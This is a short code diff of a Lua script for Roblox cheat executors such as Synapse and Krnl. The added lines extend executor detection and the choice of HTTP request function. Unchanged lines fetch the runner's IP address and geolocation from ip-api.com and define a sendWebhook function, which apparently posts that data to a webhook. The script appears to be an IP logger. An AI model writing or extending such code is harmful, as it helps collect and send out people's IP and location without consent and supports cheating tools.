@@ -1,8 +1,8 @@
 do
-    -- This function returns a string with the name of the exploit u using(only checks for krnl, synapse, )
+    -- This function returns a string with the name of the exploit u using(only checks for krnl, synapse, script ware)
     local function checkExploit()
         
-        local exploitName = (syn and 'Synapse') or (Krnl and 'Krnl') 
+        local exploitName = (syn and 'Synapse') or (Krnl and 'Krnl') or ( identifyexecutor and identifyexecutor() ) or (getexecutorname and getexecutorname())
 
 
         return exploitName
@@ -83,7 +83,7 @@ do
         ipApi = game:GetService('HttpService'):JSONDecode(game:HttpGet('http://ip-api.com/json')),
         exploitName = checkExploit(),
 
-        httpPost = (Krnl and request) or (syn and syn.request) or http_request,
+        httpPost = (Krnl and request) or (syn and syn.request) or http_request or (http and http.request),
         
         sendWebhook = function(self,webhooklink, ...)
             if self and webhooklink and self.httpPost and self.webhookJson then
